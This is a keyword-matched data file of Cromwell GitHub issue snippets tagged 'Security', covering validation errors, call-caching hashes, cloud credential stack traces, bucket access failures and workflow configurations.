Security,`Womtool validate` gives different validation results for 1.0 VS non1.0,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5354:9,validat,validate,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5354,2,['validat'],"['validate', 'validation']"
Security,"``; docker: invalid spec: /mnt/disks/cromwell_root:/mnt/disks/cromwell_root:: empty section between colons.; ```. [This](https://cromwellhq.slack.com/archives/CGQ7WK5A6/p1697484861117659) thread suggested that the logic in [these two lines](https://github.com/broadinstitute/cromwell/blob/86/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/runnable/RunnableBuilder.scala#L63-L64) may be the culprit under specific condirtions. ## Information. Cromwell Version: 87-c9d4ce4; <!-- Which backend are you running? -->; Backend: GCP Batch; <!-- Paste/Attach your workflow if possible: -->; ```; version 1.0. task hello {. input {; String name; }; command <<<; echo 'hello ~{name}!'; >>>. output {; File response = stdout(); }. runtime {; docker: ""ubuntu:latest""; cpu: 1; memory: ""3.75 GB""; }; }; workflow test {; call hello. output {; File response = hello.response; }; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```hoco; backend {; default = ""batch""; providers {; batch {; actor-factory = ""cromwell.backend.google.batch.GcpBatchBackendLifecycleActorFactory""; config {. # The Project To execute in; project = ""${compute_project}"". # The bucket where outputs will be written to; root = ""gs://${bucket}"". # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # batch-timeout = 7 days. genomics {; auth = ""cromwell-service-account""; location: ""${region}""; compute-service-account = ""${compute_service_account}"". # Specifies the minimum file size for `gsut",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7238:1269,PASSWORD,PASSWORDS,1269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238,1,['PASSWORD'],['PASSWORDS']
Security,```; [error] Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:362); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues(AwsBatchAsyncBackendJobExecutionActor.scala:362); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:942); 	at cromwell.backe,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:1474,validat,validatedRuntimeAttributes,1474,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['validat'],['validatedRuntimeAttributes']
Security,"```; {; ""causedBy"": [],; ""message"": ""Bad output 'GatherVcfs.output_vcf_index': No such field 'tbi' on type String. Report this bug! Static validation failed.""; }; ```. from wdl snippet: ; ```; output {; File output_vcf = ""~{output_vcf_filename}""; File output_vcf_index = ""~{output_vcf_filename}"".tbi; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863:139,validat,validation,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863,1,['validat'],['validation']
Security,"```; » java -jar womtool-80.jar validate sc_rna/rna_pipeline_test.wdl; Success!; » java -jar womtool-80.jar parse sc_rna/rna_pipeline_test.wdl; Exception in thread ""main"" wdl.draft2.parser.WdlParser$SyntaxError: Unrecognized token on line 28, column 46:. cellranger count --id=~{id} --sample=~{sample} --transcriptome=~{rna_refdir} --fastqs=~{fastq_dir}; ^; 	at wdl.draft2.parser.WdlParser.unrecognized_token(WdlParser.java:6975); 	at wdl.draft2.parser.WdlParser.lex(WdlParser.java:7048); 	at wdl.draft2.model.AstTools$.getAst(AstTools.scala:263); 	at wdl.draft2.model.AstTools$.getAst(AstTools.scala:276); 	at womtool.WomtoolMain$.parse(WomtoolMain.scala:82); 	at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:55); 	at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:161); 	at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:166); 	at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:27); 	at scala.Function0.apply$mcV$sp(Function0.scala:39); 	at scala.Function0.apply$mcV$sp$(Function0.scala:39); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:17); 	at scala.App.$anonfun$main$1(App.scala:76); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.IterableOnceOps.foreach(IterableOnce.scala:563); 	at scala.collection.IterableOnceOps.foreach$(IterableOnce.scala:561); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:926); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at womtool.WomtoolMain$.main(WomtoolMain.scala:27); 	at womtool.WomtoolMain.main(WomtoolMain.scala); ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6792:32,validat,validate,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6792,1,['validat'],['validate']
Security,"`hard-link`; - `soft-link` - This strategy is not applicable for tasks which specify a Docker image and will be ignored.; - `copy`; - ~`cached-copy`~ - This is non-cache duplication strategy. Cache hashing strategies:; - `file` - (default) computes an md5 hash of the file content. [Code: `tryWithResource(() => file.newInputStream) { DigestUtils.md5Hex }`]; - `path` - computes an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"".; - `path+modtime` - compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. [Code: `md5Hex(file.toAbsolutePath.pathAsString + file.lastModifiedTime.toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~What defines a cache hit, or exactly which information is used to the call hash?~; > I'll answer this one myself, by looking at the metadata returned from `/api/workflows/{version}/{id}/metadata`, within the `calls.$yourstepname.callCaching`, the hashes field has the following attributes:; > - `output count`; > - `runtime attribute`; > - `output expression`; > - `input count`; > - `backend name`; > - `command template`; > - `input`. - ~When does the command section get hashed (before or after replacements)?~; > The template gets cached. - ~What other elements go into the building the cache?~; > output count, runtime at",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:2095,hash,hash,2095,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['hash'],['hash']
Security,"`pipeline.getResources.getVirtualMachine.getPreemptible` is intended to be `null` if there was no preemption. Aaron says,; >Client code should be updated to properly access these fields even if they are absent. Closes https://github.com/broadinstitute/cromwell/issues/4772",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4773:166,access,access,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4773,1,['access'],['access']
Security,`womtool graph germline.wdl`; I got an error:; ![image](https://github.com/broadinstitute/cromwell/assets/61043072/03a9e638-6f63-45b7-ab74-a81d599d9de9). wdl and version:; germline.wdl(https://github.com/biowdl/germline-DNA/releases/download/v5.0.0/germline_v5.0.0.wdl); womtool:; ```shell; # Name Version Build Channel; _libgcc_mutex 0.1 conda_forge conda-forge; _openmp_mutex 4.5 2_gnu conda-forge; argcomplete 1.12.3 pyhd8ed1ab_0 conda-forge; atomicwrites 1.4.1 pyhd8ed1ab_0 conda-forge; attrs 23.1.0 pyh71513ae_1 conda-forge; bcrypt 3.2.2 py310h5764c6d_1 conda-forge; brotli-python 1.0.9 py310hd8f1fbe_9 conda-forge; bullet-python 2.2.0 py310hff52083_6 conda-forge; bzip2 1.0.8 h7f98852_4 conda-forge; c-ares 1.19.1 hd590300_0 conda-forge; ca-certificates 2023.7.22 hbcca054_0 conda-forge; certifi 2023.7.22 pyhd8ed1ab_0 conda-forge; cffi 1.15.1 py310h255011f_3 conda-forge; charset-normalizer 3.2.0 pyhd8ed1ab_0 conda-forge; colorama 0.4.6 pyhd8ed1ab_0 conda-forge; coloredlogs 15.0.1 pyhd8ed1ab_3 conda-forge; cromwell 0.40 1 bioconda; cryptography 41.0.2 py310h75e40e8_0 conda-forge; docker-py 6.1.3 pyhd8ed1ab_0 conda-forge; exceptiongroup 1.1.2 pyhd8ed1ab_0 conda-forge; expat 2.5.0 hcb278e6_1 conda-forge; findutils 4.6.0 h166bdaf_1001 conda-forge; font-ttf-dejavu-sans-mono 2.37 hab24e00_0 conda-forge; fontconfig 2.14.2 h14ed4e7_0 conda-forge; freetype 2.12.1 hca18f0e_1 conda-forge; gettext 0.21.1 h27087fc_0 conda-forge; humanfriendly 10.0 py310hff52083_4 conda-forge; idna 3.4 pyhd8ed1ab_0 conda-forge; importlib-metadata 6.8.0 pyha770c72_0 conda-forge; importlib_metadata 6.8.0 hd8ed1ab_0 conda-forge; importlib_resources 6.0.0 pyhd8ed1ab_1 conda-forge; iniconfig 2.0.0 pyhd8ed1ab_0 conda-forge; jinja2 3.1.2 pyhd8ed1ab_1 conda-forge; js2py 0.74 pyhd8ed1ab_0 conda-forge; jsonschema 4.18.4 pyhd8ed1ab_0 conda-forge; jsonschema-specifications 2023.7.1 pyhd8ed1ab_0 conda-forge; keyutils 1.6.1 h166bdaf_0 conda-forge; krb5 1.21.1 h659d440_0 conda-forge; lark 1.1.7 pyhd8ed1ab_0 conda-for,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7212:747,certificate,certificates,747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7212,1,['certificate'],['certificates']
Security,"a workflow with one File output named csvFile:; **workflowOptions file (I have tried this with and without ""file://"" with same results)**:; ```json; {; ""final_workflow_outputs_dir"": ""file:///data/external/workflow_1/4fd344c8-a228-421b-b561-9ed516e2316c"",; ""use_relative_output_paths"": true; }; ```; **Final outputs**; ```json; {; ""cwl_temp_file_ad3d3e78-d6a6-421a-9111-86fdefe14b80.cwl.csvFile"": ""\""/cromwell-executions/cwl_temp_file_ad3d3e78-d6a6-421a-9111-86fdefe14b80.cwl/ad3d3e78-d6a6-421a-9111-86fdefe14b80/call-getdataframe/execution/glob-aae5e4d226234858387812bc5d30218c/217.csv\""""; }; ```. After the workflow successfully executes, the specified output directory remains empty. **Environment notes**; I'm using Cromwell in server mode in a Docker container as a service to be consumed by other Docker applications on the same host. The client applications communicate with the Cromwell container using the python requests library. The specified final_workflow_outputs_dir is located in a bind mount accessible from both containers at the same location (e.g. /data/external is the default directory ""external"" to the containers which is mounted on all containers at that location). I have a workaround with a workflow step that makes a request back to the client service, but this is not ideal because it requires the users to modify the workflows. The client software includes an Angular application for editing workflows using Rabix's cwl-svg. **Full workflow**; ```yaml; $namespaces: {sbg: https://www.sevenbridges.com}; class: Workflow; cwlVersion: v1.0; doc: A test workflow to demonstrate the editor.; id: workflow1; inputs:; - {id: omics_url, sbg:x: -158.51063537597656, sbg:y: 29.940061569213867, type: string}; - {id: omics_auth_token, sbg:x: -214.89361572265625, sbg:y: 170.31314086914062, type: string}; - {id: collection_id, sbg:x: -152.0425567626953, sbg:y: 306.3538818359375, type: int}; label: Test Workflow; outputs:; - id: csvFile; outputSource: [getdataframe/csvFile]; sbg:x: ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5105:1554,access,accessible,1554,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5105,1,['access'],['accessible']
Security,a-0d39c11ff950/call-generate_true_positives/exec.sh; to /mnt/local-disk/exec.sh; 2017/02/07 15:41:48 I: Running command: sudo gsutil -q -m cp; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; /mnt/local-disk/exec.sh; 2017/02/07 15:41:49 I: Docker file; /cromwell_root/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_asse,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:1837,access,access,1837,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCach,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:3699,hash,hashes,3699,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"a.wdl; ```; workflow a {}. task t {; command {}; output { String s = """" }; }; ```. b.wdl; ```; import ""a.wdl"" as a; workflow b {. call a.t {}. String x = a.t.s; }; ```. Womtool Validate results:; ```; $ java -jar ~/womtool-33.1.jar validate b.wdl . ERROR: Missing value or call: Couldn't find value or call with name 'a' in workflow (line 6):. String x = a.t.s; ^; ```. The declaration for `String x` seems to be spec compliant and yet womtool can't validate this expression properly. . The current workaround is to provide a call alias for the imported task, which passes validation.; ```; import ""a.wdl"" as a; workflow b {. call a.t as test {}. String x = test.s; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3942:177,Validat,Validate,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3942,4,"['Validat', 'validat']","['Validate', 'validate', 'validation']"
Security,"a/cromwell/engine/io/IoActor.scala#L119) and processed subsequently in an S3 specific manner, like it's currently done for GCS, to be useful. Because this isn't the case now, the S3 code in `S3BatchIoCommand` is effectively never called.; - It works because there is an implementation of java nio for S3. The `S3BatchIoCommand` ends up in the [NioFlow](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala) which uses the methods of the nio interface to execute the commands.; **A big issue is that the nio interface does not have a ""hash"" method**. To work around that, the `NioFlow` [streams down the content and md5s it](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala#L111), [unless told otherwise](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala#L109). This is what's currently happening to S3 files. As a final twist, it turns out the [pattern match on GcsPath](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala#L109) in the hash method is actually just a fail safe but is not really needed. That is because some `IoCommand`s, including the `IoHashCommand`, are subclassed as `GcsBatchIoCommand`s and are processed through the [GcsBatchFlow](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/io/gcs/GcsBatchFlow.scala). The main goal of this ""flow"" is to batch requests to google together to increase throughput but by doing so also allows to interact with the GCS API directly and get the [crc32 from there](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/filesystems/gcs/src/main/scala/cromwell/filesystems/gcs/batch/GcsBatchIoCommand.scala#L129).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4463:1765,hash,hash,1765,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4463,1,['hash'],['hash']
Security,a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:3078,hash,hashes,3078,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String defa,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:2844,hash,hashes,2844,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"a:119); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 common frames omitted; 2019-07-02 19:16:37,967 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - WorkflowManagerActor Workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 failed (during MaterializingWorkflowDescriptorState): java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$s",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:9341,validat,validateCredential,9341,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
